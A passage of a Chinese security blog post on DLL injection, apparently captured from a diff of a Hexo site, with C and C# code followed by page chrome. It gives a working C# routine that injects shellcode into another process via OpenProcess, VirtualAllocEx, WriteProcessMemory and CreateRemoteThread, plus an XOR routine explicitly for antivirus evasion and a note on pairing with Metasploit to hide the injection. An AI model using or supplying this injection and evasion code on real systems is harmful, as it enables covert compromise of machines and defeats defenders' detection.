class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;windows.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdio.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;malloc.h&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"MemoryModule.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*addNumberProc)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_FILE <span class="meta-string">"C:\\users\\root\\desktop\\reflective_dll.x64.dll"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LoadFromFile</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	addNumberProc addNumber;</span><br><span class="line">	HINSTANCE handle = LoadLibrary((LPCWSTR)DLL_FILE);</span><br><span class="line">	<span class="keyword">if</span> (handle == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	addNumber = (addNumberProc)GetProcAddress(handle, <span class="string">"addNumbers"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"From file: %d\n"</span>, addNumber(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">	FreeLibrary(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LoadFromMemory</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *data=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	HMEMORYMODULE <span class="keyword">module</span>;</span><br><span class="line">	addNumberProc addNumber;</span><br><span class="line">	</span><br><span class="line">	fp = fopen(DLL_FILE, <span class="string">"rb"</span>);</span><br><span class="line">	<span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Can't open DLL file \"%s\"."</span>, DLL_FILE);</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	size = ftell(fp);</span><br><span class="line">	data = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">	fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">	fread(data, <span class="number">1</span>, size, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">module</span> = MemoryLoadLibrary(data);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">module</span> == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Can't load library from memory.\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addNumber = (addNumberProc)MemoryGetProcAddress(<span class="keyword">module</span>, <span class="string">"addNumbers"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"From memory: %d\n"</span>, addNumber(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">	MemoryFreeLibrary(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">		<span class="built_in">free</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LoadFromFile();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">	LoadFromMemory();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/DLLInjection/4.png" alt="4.png"></p>
+<h2 id="dll注入利用"><a href="#dll注入利用" class="headerlink" title="dll注入利用"></a>dll注入利用</h2><h3 id="反射型DLL注入免杀"><a href="#反射型DLL注入免杀" class="headerlink" title="反射型DLL注入免杀"></a>反射型DLL注入免杀</h3><p>这里使用c#来实现。</p>
+<p>首先声明api：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern HANDLE OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern HMODULE GetModuleHandle(string lpModuleName);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern IntPtr GetProcAddress(HMODULE hModule, string lpProcName);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern IntPtr VirtualAllocEx(HANDLE hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern bool WriteProcessMemory(HANDLE hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern IntPtr CreateRemoteThread(HANDLE hProcess,IntPtr lpThreadAttributes, uint dwStackSize, </span><br><span class="line">                                                IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">        // privileges used for OpenProcess</span><br><span class="line">        protected const uint PROCESS_ALL_ACCESS = PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | </span><br><span class="line">                    PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | </span><br><span class="line">                    PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_INFORMATION | </span><br><span class="line">                    PROCESS_SET_QUOTA | PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE | </span><br><span class="line">                    PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | SYNCHRONIZE;</span><br><span class="line">        protected const uint PROCESS_CREATE_PROCESS = 0x80;</span><br><span class="line">        protected const uint PROCESS_CREATE_THREAD = 0x2;</span><br><span class="line">        protected const uint PROCESS_DUP_HANDLE = 0x40;</span><br><span class="line">        protected const uint PROCESS_QUERY_INFORMATION = 0x400;</span><br><span class="line">        protected const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;</span><br><span class="line">        protected const uint PROCESS_SET_INFORMATION = 0x200;</span><br><span class="line">        protected const uint PROCESS_SET_QUOTA = 0x100;</span><br><span class="line">        protected const uint PROCESS_SUSPEND_RESUME = 0x800;</span><br><span class="line">        protected const uint PROCESS_TERMINATE = 0x1;</span><br><span class="line">        protected const uint PROCESS_VM_OPERATION = 0x8;</span><br><span class="line">        protected const uint PROCESS_VM_READ = 0x10;</span><br><span class="line">        protected const uint PROCESS_VM_WRITE = 0x20;</span><br><span class="line">        protected const uint SYNCHRONIZE = 0x100000;</span><br><span class="line"></span><br><span class="line">        // used for VirtualAllocEx</span><br><span class="line">        const uint MEM_COMMIT = 0x00001000;</span><br><span class="line">        const uint MEM_RESERVE = 0x00002000;</span><br><span class="line">        const uint PAGE_READWRITE = 4;</span><br></pre></td></tr></table></figure>
+<p>然后可以使用下面的方式来实现dll注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public static void ReflectiveDLLInject(int targetId, byte[] shellcode)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;</span><br><span class="line">                IntPtr lpThreadId = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);</span><br><span class="line">                Console.WriteLine($&quot;[+] Getting the handle for the target process: &#123;procHandle&#125;.&quot;);</span><br><span class="line">                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);</span><br><span class="line">                Console.WriteLine($&quot;[+] Allocating memory in the remote process &#123;remoteAddr&#125;.&quot;);</span><br><span class="line">                Console.WriteLine($&quot;[+] Writing shellcode at the allocated memory location.&quot;);</span><br><span class="line">                if (WriteProcessMemory(procHandle, remoteAddr, shellcode, (uint)shellcode.Length, out lpNumberOfBytesWritten))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine($&quot;[+] Shellcode written in the remote process.&quot;);</span><br><span class="line">                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine($&quot;[+] Failed to inject shellcode.&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>然后将payload进行加密，再在主程序内还原即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] xor(byte[] input)</span><br><span class="line">        &#123;</span><br><span class="line">            char[] key = &#123; &apos;x&apos;, &apos;x&apos;, &#125;;</span><br><span class="line">            byte[] output = new byte[input.Length];</span><br><span class="line">            for (int i = 0; i &amp;lt; input.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                output[i] = (byte)(input[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line">            return output;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>然后在调用函数执行即可，不过DLL加密后的shellcode都会特别长，不适合命令行输入，命令行只支持8000+字符的输入，可以考虑分离免杀的方式来进行执行。</p>
+<h3 id="反射DLL与MSF联动"><a href="#反射DLL与MSF联动" class="headerlink" title="反射DLL与MSF联动"></a>反射DLL与MSF联动</h3><p>倾璇师傅提出的思路，膜拜。</p>
+<p><img src="../images/DLLInjection/5.png" alt="5.png"></p>
+<p>进程中也看不到明显的dll注入</p>
+<p><img src="../images/DLLInjection/6.png" alt="6.png"></p>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/wf751620780/p/10730013.html" target="_blank" rel="noopener">https://www.cnblogs.com/wf751620780/p/10730013.html</a><br><a href="https://payloads.online/archivers/2020-01-02/1" target="_blank" rel="noopener">https://payloads.online/archivers/2020-01-02/1</a><br><a href="https://rootrain.me/2020/02/29/%E4%BD%BF%E7%94%A8.NET%E5%AE%9E%E7%8E%B0DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/" target="_blank" rel="noopener">https://rootrain.me/2020/02/29/%E4%BD%BF%E7%94%A8.NET%E5%AE%9E%E7%8E%B0DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/</a><br><a href="https://ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection" target="_blank" rel="noopener">https://ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection</a><br><a href="https://ired.team/offensive-security/code-injection-process-injection/dll-injection" target="_blank" rel="noopener">https://ired.team/offensive-security/code-injection-process-injection/dll-injection</a><br><a href="https://www.t00ls.net/viewthread.php?tid=51601&amp;highlight=DLL%E6%B3%A8%E5%85%A5" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=51601&amp;highlight=DLL%E6%B3%A8%E5%85%A5</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87APC%E5%AE%9E%E7%8E%B0Dll%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87Sysmon%E7%9B%91%E6%8E%A7/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87APC%E5%AE%9E%E7%8E%B0Dll%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87Sysmon%E7%9B%91%E6%8E%A7/</a><br><a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a><br><a href="https://www.cnblogs.com/uAreKongqi/p/6012353.html" target="_blank" rel="noopener">https://www.cnblogs.com/uAreKongqi/p/6012353.html</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/DLLinjection/">DLL injection</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年05月14日 - 15:05</p>
+  <p><span>最后更新:</span>2020年05月14日 - 15:05</p>
+  <p><span>原始链接:</span><a href="/DLLinjection/" title="DLL injection">https://lengjibo.github.io/DLLinjection/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/DLLinjection/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/LateralMovement/" rel="next" title="LateralMovement(横向移动)">
+                <i class="fa fa-chevron-left"></i> LateralMovement(横向移动)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Persistence/" rel="prev" title="windows单机Persistence">
+                windows单机Persistence <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">104</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">116</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sqlmap.wiki/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是dll注入"><span class="nav-number">1.</span> <span class="nav-text">什么是dll注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dll注入实现过程"><span class="nav-number">1.1.</span> <span class="nav-text">dll注入实现过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dll注入demo："><span class="nav-number">1.2.</span> <span class="nav-text">dll注入demo：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#demo2"><span class="nav-number">1.3.</span> <span class="nav-text">demo2:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型dll注入："><span class="nav-number">1.4.</span> <span class="nav-text">反射型dll注入：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dll注入利用"><span class="nav-number">2.</span> <span class="nav-text">dll注入利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型DLL注入免杀"><span class="nav-number">2.1.</span> <span class="nav-text">反射型DLL注入免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反射DLL与MSF联动"><span class="nav-number">2.2.</span> <span class="nav-text">反射DLL与MSF联动</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
